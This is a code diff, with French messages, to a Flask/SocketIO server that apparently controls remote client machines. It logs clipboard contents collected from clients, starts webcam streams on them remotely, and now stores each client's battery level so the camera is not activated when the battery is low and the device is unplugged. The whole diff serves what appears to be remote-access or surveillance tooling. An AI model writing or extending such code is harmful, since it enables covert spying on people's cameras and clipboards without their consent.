@@ -27,6 +27,7 @@ db.init_app(app)
 migrate = Migrate(app, db)
 jwt = JWTManager(app)
 video_frames = Queue()
+battery_status = {}
 
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=50 ** 8)
 
@@ -357,7 +358,14 @@ class GetWebcamLink(Resource):
     def get(self, client_id):
         client = Client.query.get(client_id)
         if client:
-            return {'status': 'success', 'message': f'/api/v1/webcam/{client_id}'}, 200
+            sid = client.sid
+            battery_info = battery_status.get(sid, {})
+            if battery_info.get('percent', 100) < 20 and not battery_info.get('power_plugged', True):
+                return {'status': 'error',
+                        'message': 'La caméra ne peut pas être activée car la batterie est inférieure '
+                                   'à 20% et non branchée.'}, 400
+            else:
+                return {'status': 'success', 'message': f'/api/v1/webcam/{client_id}'}, 200
         else:
             return {'status': 'error', 'message': 'Client non trouvé.'}, 404
 
@@ -370,6 +378,12 @@ class StreamWebcam(Resource):
             return {'status': 'error', 'message': 'Client non trouvé.'}, 404
         if client.status == 'offline':
             return {'status': 'error', 'message': 'Client hors ligne.'}, 400
+
+        sid = client.sid
+        battery_info = battery_status.get(sid, {})
+        if battery_info.get('percent', 100) < 20 and not battery_info.get('power_plugged', True):
+            return {'status': 'error', 'message': 'La caméra ne peut pas être activée car la batterie est inférieure '
+                                                  'à 20% et non branchée.'}, 400
 
         socketio.emit('start_stream', room=client.sid)
         threading.Thread(target=gen_frames, args=(socketio,)).start()
@@ -586,6 +600,12 @@ def handle_clipboard(data):
             db.session.add(new_command)
             db.session.commit()
         app.logger.info(f"Contenu du clipboard reçu de {client.ip} et enregistré sous {clipboard_path}")
+
+
+@socketio.on('battery_status')
+def handle_battery_status(data):
+    sid = request.sid
+    battery_status[sid] = data
 
 
 @socketio.on('webcam_response')
